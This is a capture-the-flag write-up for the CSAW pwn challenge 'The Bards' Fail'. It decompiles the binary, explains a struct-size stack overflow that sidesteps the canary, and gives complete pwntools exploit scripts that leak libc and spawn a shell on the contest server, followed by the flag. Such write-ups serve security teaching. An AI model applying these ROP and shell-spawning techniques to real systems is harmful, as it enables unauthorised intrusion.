## The Bards' Fail [150]
*Pwn your way to glory! You do not need fluency in olde English to solve it, it is just for fun.*

`nc pwn.chal.csaw.io 5019`

Files: `bard`, `libc-2.27.so`

This challenge was quickly finished with [`pwnscripts`](https://github.com/152334H/pwnscripts). Try it!

This writeup will be a lot more succinct than my other write-ups. Most of the exploit is in figuring out what the program does, which is not the most exciting part of pwn.
### Decompilation
`bard` is much larger than `roppity`. The full decompilation is left in the appendix<sup>1</sup>, but there are still a few important parts of it to go over.

Everything that occurs is related to this function, which is called from `main()`:
```c
uint64_t run_everything_400F7C() {
  char s[488];     // [rsp+20h] [rbp-1F0h]
  uint64_t cookie; // [rsp+208h] [rbp-8h]
  // The cookie here is important to note.
  cookie = __readfsqword(0x28);
  memset(s, 0, 480);
  for ( int i = 0, s_ind = 0; i <= 9; ++i )
    s_ind += choose_alignment_400EB7(&s[s_ind], i);
  char *s_ptr = s;
  for ( int j = 0; j <= 9; ++j )
    s_ptr = combat_with_bard_sj_400DF4(s_ptr, j);
  return __readfsqword(0x28) ^ cookie;
}
```
Two things happen inside this function:
1. Under the `choose_alignment()` loop, you get to initialise `10` different `Bard`s.
    
    Each Bard is sort-of a `Union`, but we can separate the different types of `Bard`s into `Good` and `Evil` types:
    ```c
    typedef struct Good {
        char weapon;
        uint8_t PAD;
        uint16_t unknown_20;
        uint32_t unknown_15;
        char name[32];
        uint64_t unknown_hex_4032000000000000;
    } Good;
    typedef struct Bad {
        char weapon;
        uint8_t PAD[7];
        uint64_t unknown_hex_4032000000000000;
        uint32_t unknown_15;
        uint16_t unknown_20;
        char name[32];
        uint8_t PAD2[2];
    } Bad;
    ```
    The values that are user-controlled are `weapon` and `name[]`. All 10 `Bards` are stored continuously on the stack, where `Good` bards take up 48 bytes and `Bad` bards take up 56.

    If you're observant, you might have noticed that the stack storage for the 10 `Bards`, s[488], is only large enough to hold 10 `Good` bards, whereas a group of 10 `Bad` bards will overflow to the end of the stack.
2.  Each of the bards have combat sessions under the `combat_with_bard()` section. As far as I can tell, this part of the binary is mostly fluff. It might be possible to leak out the stack from this part, but it wasn't necessary for the full exploit.

If you need more details, you should really check out the code in the Appendix. Everything after here will be about the exploit.
### Overflow
The stack is structured something like this:
```
+------------------------+-----------+-----------+-------------------------------+
|   Large s[488] chunk   |   canary  | rbp-store | return pointer and ROP region |
+----------488-----------|-----8-----|-----8-----|------as long as you want------+
```
If we do the math, the maximum size amount of memory we can write is `56*10 == 560`. However, blindly allocating `Bad` bards is likely to overwrite the stack canary and lead to a crash. We need to ensure that memory is *not* written to the canary, and that memory is also written to the return pointer region.

To do this, we can start by allocating 7 `Bad` bards and 1 `Good` bard:
```
+------+-------+
| Good | Bad*7 |
+--48--+--392--+
```
After that, we allocate another `Bad` bard. This will cover the stack canary under `Bad->name[]`, which we can specifically choose to not overwrite:
```
+-----------------------------+-----------+-----------+-------------------------------+
|      Large s[488] chunk     |   canary  | rbp-store | return pointer and ROP region |
+-------------488-------------|-----8-----|-----8-----|------as long as you want------+
+------+-------+-----------Bad------------+
| Good | Bad*7 | Garbage | name[],padding |
+--48--+--392--+----22---+-----0x20+2-----+
```
Then, we can allocate a final `Good` chunk that will allow us to write to the ROP region as `name[]`:
```
+-----------------------------+-----------+-----------+------------+
|      Large s[488] chunk     |   canary  | rbp-store | ROP region |
+-------------488-------------|-----8-----|-----8-----|-----32-----+
+------+-------+-----------Bad------------+----------Good----------+
| Good | Bad*7 | Garbage | name[],padding |  garbage  |   name[]   |
+--48--+--392--+----22---+-----0x20+2-----+-----8-----|-----32-----+
```
If all these ASCII diagrams are confusing, hopefully a POC can convince you:
```python
from pwnscripts import *
context.binary = './bard'
main = 0x40107B #context.binary.symbols['main']

class bard(pwnlib.tubes.process.process):
    def create(r, alignment:str, weapon:int, name: bytes):
        r.sendlineafter('choose thy alignment (g = good, e = evil):\n', alignment)
        for _ in range(3): r.recvline()
        r.sendline(str(weapon))
        r.sendafter('name:\n', name)
    def combat(r, choice:str, v:int=None):
        r.sendlineafter('(r)un\n', choice)
        if choice == 'r': return r.recvline()
        if choice in 'mef': return ''.join([r.recvline() for _ in range(3)])

rop = ROP(context.binary)
rop.puts(context.binary.got['putchar'])
rop.call(main, [])

r = bard('./bard')
r.create('g', 1, b'\n')
for i in range(8): r.create('e', 1, b'\n')
r.create('g', 1, rop.chain())
log.info('ROP chain sent.')
for i in range(10): r.combat('r')

r.interactive()
```
The PoC succeeds; the program jumps back to main after execution:
```
$ python3.8 poc.py
[*] '/path/to/bard'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './bard'
[+] Starting local process './bard': pid 18825
[*] ROP chain sent.
[*] Switching to interactive mode
\x10\xcc\xde[\x7f
*** Welcome to the Bards' Fail! ***

Ten bards meet in a tavern.
They form a band.
You wonder if those weapons are real, or just props...

Bard #1, choose thy alignment (g = good, e = evil):
$ 
```
At the same time, the `ROP` chain we're using here allows us to leak the address of `libc` via a call to `puts(GOT['printf'])`. From here, we only need to call `system("/bin/sh")` to win.

### Server issues
It was easy enough to continue that PoC to make a full blown exploit:
```python
from pwnscripts import *
from sys import argv
if len(argv) > 1: LOCAL = True
else: LOCAL = False
if LOCAL: db = libc_db('./libc-database', binary='/lib/x86_64-linux-gnu/libc.so.6')
else: db = libc_db('./libc-database', binary='./libc-2.27.so')
context.binary = './bard'
...
if LOCAL: r = bard('./bard')
else: r = rbard('pwn.chal.csaw.io', 5019)
r.create('g', 1, b'\n')
...
for i in range(10): r.combat('r')

base = db.calc_base('putchar', extract_first_bytes(r.recvline(),6))
log.info('base: ' + hex(base))
rop = ROP(context.binary)
rop.call(db.symbols['system'] + base, [db.symbols['str_bin_sh'] + base])

r.create('g', 1, b'\n')
for i in range(8): r.create('e', 1, b'\n')
r.create('g', 1, rop.chain())
log.info('Second ROP chain sent.')

for i in range(10): r.combat('r')
r.interactive()
```
Strangely, this payload, while working perfectly on local:
```python
$ python3.8 poc.py 1
[*] '/path/to/bard'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './bard'
[+] Starting local process './bard': pid 19069
[*] First ROP chain sent.
[*] base: 0x7fdfe5260000
[*] Second ROP chain sent.
[*] Switching to interactive mode
$ echo hi
hi
$
```
...was completely broken on remote:
```python
$ python3.8 poc.py
[*] '/path/to/bard'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './bard'
[+] Opening connection to pwn.chal.csaw.io on port 5019: Done
[*] First ROP chain sent.
[*] base: 0x7f308d575000
[*] Second ROP chain sent.
Traceback (most recent call last):
  File "poc.py", line 54, in <module>
    for i in range(10): r.combat('r')
  File "poc.py", line 28, in combat
    if choice == 'r': return r.recvline()
  ...
  File "/usr/local/lib/python3.8/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
```
After a long period of debugging, I realised that this was due to two separate issues:
1. `system()` on remote requires a valid `rbp`<sup>2</sup>. The `rbp` applied by the final `Bad` bard is filled with garbage values.
2. The remote simply fails to send the final line of output for the last instance of `combat()`. Not entirely sure why.

Editing the exploit to use a `one_gadget`<sup>3</sup> instead, we're able to solve for (1). Issue (2) was handled by editing the script's i/o a little bit.

That really fails to explain anything, so here is the final script:
```python
from pwnscripts import *
context.binary = './bard'
main = 0x40107B #context.binary.symbols['main']
db = libc_db('./libc-database', binary='./libc-2.27.so')

class rbard(pwnlib.tubes.remote.remote):
    def create(r, alignment:str, weapon:int, name: bytes):
        r.sendlineafter('choose thy alignment (g = good, e = evil):\n', alignment)
        for _ in range(3): r.recvline()
        r.sendline(str(weapon))
        r.sendafter('name:\n', name)
    def combat(r, choice:str, v:int=None):
        r.sendlineafter('(r)un\n', choice)
        if choice == 'r': return r.recvline()
        if choice in 'mef': return ''.join([r.recvline() for _ in range(3)])

rop = ROP(context.binary)
rop.puts(context.binary.got['putchar'])
rop.call(main, [])

r = rbard('pwn.chal.csaw.io', 5019)
r.create('g', 1, b'\n')
for i in range(8): r.create('e', 1, b'\n')
r.create('g', 1, rop.chain())
log.info('First ROP chain sent.')

for i in range(10): r.combat('r')
base = db.calc_base('putchar', extract_first_bytes(r.recvline(),6))
log.info('base: ' + hex(base))
rop = ROP(context.binary)
rop.call(db.select_gadget(1)+base, [])

r.create('g', 1, b'\n')
for i in range(8): r.create('e', 1, b'\n')
r.create('g', 1, rop.chain())
log.info('Second ROP chain sent.')

for i in range(9): r.combat('r')
r.sendlineafter('(r)un\n', 'r') # Remote weirdness
r.interactive()
```
That's it.
### Flag
`flag{why_4r3_th3y_4ll_such_c0w4rds??}`
### Appendix
1. Here is the entire C code:
```C
#include <...>
char alignments_byte_6020A0[16];    // Global variable
// For both of these structs, there is no invisible padding
typedef struct Good {
  char weapon;
  uint8_t PAD;
  uint16_t unknown_20;
  uint32_t unknown_15;
  char name[32];
  uint64_t unknown_hex_4032000000000000;
} Good;
typedef struct Bad {
  char weapon;
  uint8_t PAD[7];
  uint64_t unknown_hex_4032000000000000;
  uint32_t unknown_15;
  uint16_t unknown_20;
  char name[32];
} Bad;
char *read_n_chars_400857(int len, char *s)
{ // This function is never directly called; it reads `len` chars into s[]
  memset(s, 0, len);
  int s_ind = 0;
  while (1) {
    char c = getchar();
    if ( c == '\n' || feof(stdin) )
      break;
    if ( s_ind < len - 1 )
      s[s_ind++] = c;
  }
  s[s_ind] = '\0';
  return s+s_ind;
}
long long read_32chars_return_first_4008DC()
{ // This function will read up-to 32 chars, but will only return the first char's value.
  char s[40];
  read_n_chars_400857(32, s);
  return s[0];
} // invis stack check here

int read_32chars_return_atoi_40091E()
{ //Like the previous func; this one reads up-to 32 chars, and returns its `atoi()` value
  char s[40];
  read_n_chars_400857(32, s);
  return atoi(s);
} // invis stack check here

ssize_t init_good_400968(Good *s)
{ // Initialiser for a bard of `good` alignment
  puts("Choose thy weapon:");
  puts("1) +5 Holy avenger longsword");         // 'l'
  puts("2) +4 Crossbow of deadly accuracy");    // 'x'
  fflush(stdout);
  char c = read_32chars_return_first_4008DC();
  if ( c == '1' )
    s->weapon = 'l';
  else {
    if ( c != '2' ) {
      printf("Error: invalid weapon selection. Selection was %c\n", c);
      exit(0);
    }
    s->weapon = 'x';
  }
  s->unknown_20 = 20;
  s->unknown_15 = 15;
  s->unknown_hex_4032000000000000 = 0x4032000000000000;
  puts("Enter thy name:");
  fflush(stdout);
  ssize_t result = read(0, s->name, 0x20);   // this is a raw read!
  for ( int i = 0; i <= 30; ++i ) { // This ignores s[31].
    result = s->name[i];
    if ( result == 0xA )
      s->name[result=i] = 0;
  }
  return result;
}

ssize_t init_evil_400A84(Bad *s)
{ // Initialiser for a bard of `bad` alignment
  puts("Choose thy weapon:");
  puts("1) Unholy cutlass of life draining");   // 'c'
  puts("2) Stiletto of extreme disappointment");// 's'
  fflush(stdout);
  char c = read_32chars_return_first_4008DC();
  if ( c == '1' )
    s->weapon = 'c';
  else {
    if ( c != '2' ) {
      printf("Error: invalid weapon selection. Selection was %c\n", c);
      exit(0);
    }
    s->weapon = 's';
  }
  s->unknown_20 = 20;
  s->unknown_15 = 15;
  s->unknown_hex_4032000000000000 = 0x4032000000000000;
  puts("Enter thy name:");
  fflush(stdout);
  ssize_t result = read(0, s->name, 0x20);
  for ( int i = 0; i <= 30; ++i ) { // Same bug as in init_good
    result = s->name[i];
    if ( result == '\n' )
      s->name[result=i] = '\0';
  }
  return result;
}
int combat_good_400BA0(char *name)
{ // Combat with a good bard
  puts("What dost thou do?");
  puts("Options:");
  puts("(b)ribe");
  puts("(f)latter");
  puts("(r)un");
  fflush(stdout);
  char c = read_32chars_return_first_4008DC();
  if ( c == 'b' ) {
    puts("How much dost thou offer for deadbeef to retire?");
    fflush(stdout);
    if ( read_32chars_return_atoi_40091E() <= 0 )
      puts("Not this time.");
    else
      puts("Alas! Thy funds are insufficient!");
    return puts("Thou hast been eaten by deadbeef.");
  }
  else if ( c == 'f' ) {
    printf("%s: \"Thy countenance art so erudite, thou must read RFCs each morning over biscuits!\"\n", name);
    puts("deadbeef: \"aaaaaaaaaaaaaaaaaaaaaaaaa...\"");
    return puts("Thou hast been eaten by deadbeef.");
  }
  else {
    if ( c != 'r' ) {
      puts("Error: invalid selection.");
      exit(0);
    }
    return printf("%s bravely runs away.\n", name);
  }
}

int combat_bad_400CD0(char *name)
{ // Combat with a bad bard
  puts("What dost thou do?");
  puts("Options:");
  puts("(e)xtort");
  puts("(m)ock");
  puts("(r)un");
  fflush(stdout);
  char c = read_32chars_return_first_4008DC();
  if ( c == 'e' ) {
    printf("%s: \"Give me five gold pieces or I'll start singing!\"\n", name);
    puts("Sheriff: \"To the gaol with thee, villain!\"");
    return printf("%s is arrested.\n", name);
  }
  else if ( c == 'm' ) {
    printf("%s: \"Thy face looks like thou took a 30-foot sprint in a 20-foot room!\"\n", name);
    puts("Sheriff: \"Zounds! That is slander!\"");
    return printf("%s is arrested.\n", name);
  }
  else {
    if ( c != 'r' ) {
      puts("Error: invalid selection.");
      exit(0);
    }
    return printf("%s flees the scene.\n", name);
  }
}

char *combat_with_bard_sj_400DF4(char *s, int j)
{ // Generic combat with a bard of index j and memory *s
  char alignment = alignments_byte_6020A0[j];
  putchar('\n');
  if ( alignment == 'g' ) {
    printf("%s confronts the evil zombie deadbeef.\n", s + 8);
    combat_good_400BA0(s + 8);
    return s+48;
  }
  else {
    if ( alignment != 'e' ) {
      puts("Error in reading alignments.");
      exit(0);
    }
    printf("%s confronts the town sheriff.\n", s + 22);
    combat_bad_400CD0(s + 22);
    return s+56;
  }
}

int64_t choose_alignment_400EB7(char *s, int i)
{ //generic bard initialiser
  putchar('\n');
  printf("Bard #%d, choose thy alignment (g = good, e = evil):\n", (unsigned int)(i + 1));
  fflush(stdout);
  char alignment = read_32chars_return_first_4008DC();
  if ( alignment == 'g' ) {
    alignments_byte_6020A0[i] = 'g';
    init_good_400968((Good *)s);
    return 48;
  }
  else {
    if ( alignment != 'e' ) {
      printf("Invalid alignment: %c\n", alignment);
      exit(0);
    }
    alignments_byte_6020A0[i] = 'e';
    init_evil_400A84((Bad *)s);
    return 56;
  }
}

uint64_t run_everything_400F7C() {
  char s[488];  // [rsp+20h] [rbp-1F0h]
  unsigned __int64 cookie; // [rsp+208h] [rbp-8h]
  // The cookie here is important to note.
  cookie = __readfsqword(0x28);
  memset(s, 0, 480);
  int s_ind = 0;
  for ( int i = 0; i <= 9; ++i )
    s_ind += choose_alignment_400EB7(&s[s_ind], i);
  char *s_ptr = s;
  for ( int j = 0; j <= 9; ++j )
    s_ptr = combat_with_bard_sj_400DF4(s_ptr, j);
  return __readfsqword(0x28) ^ cookie;
}

int main() {
  puts("*** Welcome to the Bards' Fail! ***\n");
  puts("Ten bards meet in a tavern.");
  puts("They form a band.");
  puts("You wonder if those weapons are real, or just props...");
  run_everything_400F7C();
  puts("Thy bards hast disbanded!\n");
  return 0;
}
```
That's really a lot of code.
2. As to why it worked locally? I did not investigate.
3. Specifically, we're using the one_gadget that has a requirement of `[rsp+0x40] == 0`. It just works.